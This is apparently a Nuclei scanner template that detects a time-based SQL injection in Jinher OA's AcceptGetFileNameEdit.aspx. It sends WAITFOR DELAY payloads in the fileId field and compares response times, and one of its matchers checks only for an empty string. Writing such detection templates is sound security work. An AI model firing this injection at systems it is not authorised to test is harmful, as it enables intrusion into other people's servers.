id: poc-yaml-jinher-acceptgetfilenameedit-aspx-sqli

info:
  name: 金和OA AcceptGetFileNameEdit.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和OA

flow: http(1) && http(2)

http:
  - id: check-login-page
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "JHSoft"

  - id: sqli-detection
    raw:
      - |
        POST /c6/Jhsoft.Web.AcceptAip/AcceptGetFileNameEdit.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        fileId=-1)WAITFOR DELAY '0:0:5'--
      - |
        POST /c6/Jhsoft.Web.AcceptAip/AcceptGetFileNameEdit.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        fileId=-1)WAITFOR DELAY '0:0:8'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ""
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
